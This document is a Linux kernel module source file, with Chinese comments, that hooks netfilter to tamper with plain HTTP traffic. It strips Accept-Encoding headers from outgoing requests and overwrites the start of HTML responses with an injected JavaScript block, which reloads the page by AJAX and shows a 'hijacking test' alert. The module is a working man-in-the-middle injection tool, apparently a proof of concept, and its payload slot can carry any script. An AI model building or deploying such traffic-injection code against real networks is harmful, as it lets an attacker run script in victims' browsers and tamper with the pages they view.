// 测试内核：3.13.0-32-generic
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <net/ip.h>
#include <net/tcp.h>
#include <linux/if_packet.h>
#include <linux/skbuff.h>
#include <linux/string.h>
// #include "zlibTool.c"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("songboyu");
MODULE_DESCRIPTION("modify http payload, base on netfilter");
MODULE_VERSION("1.0");
// if (window.ActiveXObject) {
// 	ajax = new ActiveXObject('Microsoft.XMLHTTP');
// } else if (window.XMLHttpRequest) {
// 	ajax = new XMLHttpRequest();
// }
// "ajax.setRequestHeader('Accept', 'text/html,notfix');" 
char code[] = "<script>" \
"var ajax = new XMLHttpRequest();" \
"ajax.open('GET', window.location.href, false);" \
"ajax.setRequestHeader('Accept', 'text/html');" 
"ajax.setRequestHeader('Fix', 'not');" 
"ajax.onreadystatechange = function() {" \
	"if ((ajax.readyState == 4) && (ajax.status == 200)) {" \
		"var c = ajax.responseText;" \
		"var i =  c.indexOf('===');" \
		"document.write(c.substring(0, i));"\
		"console.log(c.substring(0, i));" \
	"}" \
"};" \
"ajax.send(null);" \
"alert('----hijacking test----');" \
"</script>";

struct node
{
	int seq;
	struct node *next;
	struct node *pre;
};

struct node *head = NULL;

// 发出请求时删除请求头中Accept-Encoding字段，防止收到gzip压缩包
int delete_accept_encoding(char *pkg)
{
	char *pK = NULL;
	char *pV = NULL;
	int len = 0;

	pK = strstr(pkg,"Accept: text/html");
	if(pK == NULL)	return 0;

	pK = strstr(pkg,"Accept-Encoding:");
	if(pK == NULL)	return 0;

	pV = strstr(pK,"\r\n");
	if(pV == NULL)	return 0;

	len = (long long)pV - (long long)pK;
	
	// 用空格覆盖Accept-Encoding:xxx内存
	memset(pK,' ',len + 2);
	printk(KERN_ALERT "---Delete Accept-Encoding---\n");
	
	return 1;
}


int build_dev_xmit_tcp (struct net_device* dev, 
			 u_char * smac, u_char * dmac,
             u_char * pkt, int pkt_len, 
             u_long sip, u_long dip, 
             u_short sport, u_short dport, 
             u_long seq, u_long ack_seq, 
             u_char syn, u_char ack, u_char psh, u_char fin)
{
	struct sk_buff * skb = NULL;
	// struct net_device * dev = NULL;
	struct ethhdr * ethdr = NULL;
	struct iphdr * iph = NULL;
	struct tcphdr * tcph = NULL;
	u_char * pdata = NULL;
	int nret = 1;
	
	if (NULL == smac || NULL == dmac) goto out;
	
	// dev = dev_get_by_name(&init_net, eth);

	if (NULL == dev) goto out;
	
	skb = alloc_skb (pkt_len + sizeof (struct iphdr) + sizeof (struct tcphdr) + LL_RESERVED_SPACE (dev), GFP_ATOMIC);
	/*
	LL_RESERVED_SPACE(dev) = 16
	alloc_skb返回以后，skb->head = skb_data = skb->tail = alloc_skb分配的内存区首地址,skb->len = 0;
	skb->end = skb->tail + size;
	注：我的机子是32位x86机器，所以没有定义NET_SKBUFF_DATA_USES_OFFSET，因而，
	skb->tail,skb->mac_header,skb->network_header,skb->transport_header这几个成员都是指针
	*/
	if (NULL == skb)
		goto out;
	skb_reserve (skb, LL_RESERVED_SPACE (dev));//add data and tail
	skb->dev = dev;
	skb->pkt_type = PACKET_OTHERHOST;
	skb->protocol = __constant_htons(ETH_P_IP);
	skb->ip_summed = CHECKSUM_NONE;
	skb->priority = 0;
	//skb->nh.iph = (struct iphdr*)skb_put(skb, sizeof (struct iphdr));
	//skb->h.th = (struct tcphdr*)skb_put(skb, sizeof (struct tcphdr));
	skb_set_network_header(skb, 0); //skb->network_header = skb->data + 0;
	skb_put(skb, sizeof (struct iphdr)); //add tail and len
	skb_set_transport_header(skb, sizeof (struct iphdr));//skb->transport_header = skb->data + sizeof (struct iphdr)
	skb_put(skb, sizeof (struct tcphdr));
	pdata = skb_put (skb, pkt_len);
	{
	if (NULL != pkt)
	memcpy (pdata, pkt, pkt_len);
	}

	{
		tcph = tcp_hdr(skb);
		memset (tcph, 0, sizeof (struct tcphdr));
		tcph->source = sport;
		tcph->dest = dport;
		tcph->seq = seq;
		tcph->ack_seq = ack_seq;
		tcph->doff = 5;
		tcph->psh = psh;
		tcph->fin = fin;
		tcph->syn = syn;
		tcph->ack = ack;
		tcph->window = __constant_htons (5840);
		skb->csum = 0;
		tcph->check = 0;
	}

	{
		iph = ip_hdr(skb);
		iph->version = 4;
		iph->ihl = sizeof(struct iphdr)>>2;
		iph->frag_off = 0;
		iph->protocol = IPPROTO_TCP;
		iph->tos = 0;
		iph->daddr = dip;
		iph->saddr = sip;
		iph->ttl = 0x40;
		iph->tot_len = __constant_htons(skb->len);
		iph->check = 0;
	}
	skb->csum = skb_checksum (skb, iph->ihl*4, skb->len - iph->ihl * 4, 0);
	tcph->check = csum_tcpudp_magic (sip, dip, skb->len - iph->ihl * 4, IPPROTO_TCP, skb->csum);
	{
		ethdr = (struct ethhdr*)skb_push (skb, 14);//reduce data and add len
		// memcpy (ethdr->h_dest, dmac, ETH_ALEN);
		// memcpy (ethdr->h_source, smac, ETH_ALEN);
		ethdr->h_proto = __constant_htons (ETH_P_IP);
	}
	nret = dev_queue_xmit(skb);
	if (0 > nret) goto out;
	printk("======send ret: %d\n", nret);

	out:
	if (0 != nret && NULL != skb)
	{
		dev_put (dev);
		kfree_skb (skb);
	}
	return (nret);
}

void fix_checksum(struct sk_buff *skb){
	struct iphdr *iph = ip_hdr(skb);
	struct tcphdr *tcph = tcp_hdr(skb);
	// 重新计算校验和
	//-------------------------------------
	int datalen = skb->len - iph->ihl*4;
	skb->ip_summed = CHECKSUM_PARTIAL;
	skb->csum_start = skb_headroom(skb) + skb_network_offset(skb) + iph->ihl * 4;
	skb->csum_offset = offsetof(struct tcphdr, check);
	// ip
	iph->check = 0;
	iph->check = ip_fast_csum(iph, iph->ihl);
	// tcp
	tcph->check = 0;
	tcph->check = ~csum_tcpudp_magic(iph->saddr, iph->daddr,
					datalen, iph->protocol, 0);
	//-------------------------------------
}

unsigned int hook_func(unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *))
{
	int codeLen = strlen(code);
	// IP数据包frag合并
	// if (0 != skb_linearize(skb)) {
	// 	return NF_ACCEPT;
	// }
	struct iphdr *iph = ip_hdr(skb);

	unsigned int tot_len = ntohs(iph->tot_len);
	unsigned int iph_len = ip_hdrlen(skb);

	unsigned int saddr = (unsigned int)iph->saddr;
	unsigned int daddr = (unsigned int)iph->daddr;

	if (iph->protocol == IPPROTO_TCP)
	{	
		// struct tcphdr *tcph = (void *)iph + iph->ihl * 4;
		struct tcphdr *tcph = tcp_hdr(skb);
		unsigned int tcplen = skb->len - (iph->ihl*4) - (tcph->doff*4);

		unsigned int sport = (unsigned int)ntohs(tcph->source);
		unsigned int dport = (unsigned int)ntohs(tcph->dest);

		char *pkg = (char *)((long long)tcph + ((tcph->doff) * 4));

		// printk(KERN_ALERT "hook_ipv4: %pI4:%d --> %pI4:%d \n", &saddr, sport, &daddr, dport);
		// 接收到的数据包
		if (sport == 80)
		{
			// 处理HTTP请求且请求返回200
			if (memcmp(pkg,"HTTP/1.1 200", 12) == 0 || memcmp(pkg,"HTTP/1.0 200", 12) == 0)
			{	
				char *p,*p1,*page;

				p = strstr(pkg,"Content-Type: text/html");
				if(p == NULL)	return NF_ACCEPT;

				page = strstr(pkg,"\r\n\r\n");
				if(page == NULL)	return NF_ACCEPT;

				page += 4;
				char *ppage = page;

				p = strstr(pkg,"Transfer-Encoding: chunked");
				if(p != NULL){
					ppage = strstr(page, "\r\n");
					if(ppage == NULL) return NF_ACCEPT;

					ppage += 2;
				}

				p = strstr(ppage,"<html");
				if(p == NULL)	return NF_ACCEPT;

				printk("Found html repsonse\n");
				int http_hdrlen = (long long)page-(long long)pkg;
				int pageLen = tcplen-http_hdrlen;

				char *ts = ppage+codeLen;
				printk("%d\n", *ts);
				while(*ts < 0) ts++;
				// 检查是否使ajax请求的回复，若是则不处理
				// ==========================================
				struct node *ptr = head;
				while(ptr != NULL){
					// printk("%ld->", ntohl(ptr->seq));
					if(ptr->seq == tcph->seq){
						if(ptr->pre != NULL) ptr->pre->next = ptr->next;
						if(ptr->next != NULL) ptr->next->pre = ptr->pre;
						kfree(ptr);
						if(ptr == head)
							head = NULL;
						printk("Ajax html repsonse\n");
						printk("------------\n");

						// memcpy(ppage+codeLen+8-oi, "=======", 7);
						// fg = strstr(ppage+codeLen, ">");
						memcpy(ts, "=======", 7);
						// pskb_trim(skb, 1000);
						// iph->tot_len = htons(skb->len);
						// tcph->fin = 1;

						//-------------------------------------
						// struct ethhdr* eth = (struct ethhdr*)skb->mac_header;
						// build_dev_xmit_tcp (skb->dev, 
						// 	eth->h_source, eth->h_dest,
						// 	NULL, 0, 
		    //                 saddr,daddr,
		    //                 tcph->source,tcph->dest,
		    //                 tcph->ack_seq, tcph->seq+tcplen,
		    //                 0, 1, 0, 1);

						fix_checksum(skb);
						return NF_ACCEPT;
					}
					ptr = ptr->next;
				}
				// ==========================================

				
				// printk("%d\n", pageLen);


				// 解压
				// char *deflateFlag = strstr(pkg,"Content-Encoding: deflate");
				// Byte odata[pageLen*10], zdata[pageLen];
				// uLong nodata = pageLen*10, nzdata = pageLen;
				// int f;	
				// char *pstart = page;
				// if(deflateFlag != NULL){
				// 	printk("----Content-Encoding: deflate----\n");

				// 	p = strstr(pkg,"Transfer-Encoding: chunked");

				// 	if(p != NULL){
				// 		pstart = strstr(page, "\r\n");
				// 		pstart += 2;
				// 	}

				// 	f = gzipDeCompress((Byte*)pstart, pageLen-((long long)pstart-(long long)page), odata, &nodata);
				// 	printk("f1: %d\n", f);
				// 	if(f != 0) return NF_ACCEPT;

				// 	printk("%s\n", odata);
				// 	ppage = odata;
				// }

				// char s[codeLen+4];
				// if(codeLen < (1000-2)){
				// 	snprintf(s, codeLen+2, code, codeLen);
				// }else if(codeLen < (10000-2) && codeLen >= (1000-2)){
				// 	snprintf(s, codeLen+3, code, codeLen+1);
				// }
				// char s[codeLen+3], u[6];
				// memcpy(u, ppage+codeLen+3, 5);
				// u[5] = '\0';
				// snprintf(s, codeLen+4, code, u);

				printk("Change html repsonse OK\n");
				printk("------------\n");

				memcpy(ppage, code, codeLen);
				

				memset(ppage+codeLen, ' ', ts-ppage-codeLen);
				
				// memcpy(ppage, s, strlen(s));

				// // 再次压缩
				// if(deflateFlag != NULL){
				// 	// printk("%s\n", ppage); 
				// 	f = gzipCompress((Byte*)ppage, nodata, zdata, &nzdata);
				// 	printk("f2: %d\n", f);
				// 	if(f != 0) return NF_ACCEPT;

				// 	// printk("%s\n", zdata);
				// 	// memset(pstart, 'p', 20);
				// 	printk("%d, %d\n", nzdata, pageLen-((long long)pstart-(long long)page));
				// 	// memcpy(pstart, zdata, nzdata);

				// 	// Byte odata1[pageLen*10];
				// 	// uLong nodata1 = pageLen*10;
				// 	// f = gzipDeCompress((Byte*)zdata, nodata, odata1, &nodata1);
				// 	// printk("f3: %d\n", f);
				// 	// if(f != 0) return NF_ACCEPT;

				// 	// printk("%s\n", odata1);
				// }
				fix_checksum(skb);
			}
		}
		else if(dport == 80)
		{	
			// 只处理GET请求
			if (memcmp(pkg,"GET",strlen("GET")) != 0)
			{
				return NF_ACCEPT;
			}
			char *p;
			p = strstr(pkg,"HTTP/1.1");
			if(p == NULL) return NF_ACCEPT;

			p = strstr(pkg,"Fix: not");
			
			// 发出请求时删除请求头中Accept-Encoding字段，防止收到gzip压缩包
			delete_accept_encoding(pkg);

			if(p != NULL){
				delete_accept_encoding(pkg);
				printk("Found ajax flag\n");

				struct node *newnode = (struct node*)kmalloc(sizeof(struct node), GFP_ATOMIC);
				struct node *ptr = head;

				newnode->seq = tcph->ack_seq;
				newnode->next = NULL;
				newnode->pre = NULL;

				if(head == NULL) {
					head = newnode;
				}else{
					while(ptr->next != NULL) {
						ptr = ptr->next;
					}
					ptr->next = newnode;
					newnode->pre = ptr;
				}
				printk("Add to list OK\n");
			}
			fix_checksum(skb);
		}
	}
	return NF_ACCEPT;
}

// 钩子函数注册
static struct nf_hook_ops http_hooks[] = 
{
	{
		.hook 			= hook_func,
		.pf 			= NFPROTO_IPV4,
		.hooknum 		= NF_INET_POST_ROUTING, 
		.priority 		= NF_IP_PRI_MANGLE,
		.owner			= THIS_MODULE
	}
};

// 模块加载
static int init_hook_module(void)
{
	nf_register_hooks(http_hooks, ARRAY_SIZE(http_hooks));
	printk(KERN_ALERT "hook_ipv4: insmod\n");

	return 0;
}

// 模块卸载
static void cleanup_hook_module(void)
{
	nf_unregister_hooks(http_hooks, ARRAY_SIZE(http_hooks));
	printk(KERN_ALERT "hook_ipv4: rmmod\n");
}

module_init(init_hook_module);
module_exit(cleanup_hook_module);
